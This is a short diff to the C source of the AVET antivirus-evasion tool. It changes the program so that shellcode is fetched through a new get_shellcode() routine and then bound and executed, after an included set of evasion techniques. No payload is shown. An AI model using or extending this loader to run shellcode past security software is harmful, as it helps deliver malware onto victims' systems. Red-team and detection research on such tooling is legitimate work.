@@ -42,6 +42,9 @@ Web: https://github.com/govolution/avet
 // Include shellcode binding technique to be used here
 #include "shellcode_binding.h"
 
+// Include shellcode retrieval method to be used here
+#include "get_shellcode.h"
+
 
 int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
@@ -62,13 +65,16 @@ int main (int argc, char **argv)
 	int c;
 
 	opterr = 0;	
-	
+		
 	// Include evasion techniques to be used here
 	#include "techniques.h"	
 	
+	// Retrieve shellcode	
+	unsigned char *shellcode = get_shellcode();	
+	
 	// Bind and execute shellcode here
-	// FVALUE is defined in defs.h by make_avet and contains the shellcode	
-	bind_shellcode(buf);
+	// buf is defined in defs.h by make_avet and contains the shellcode	
+	bind_shellcode(shellcode);
 	
 
 //#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
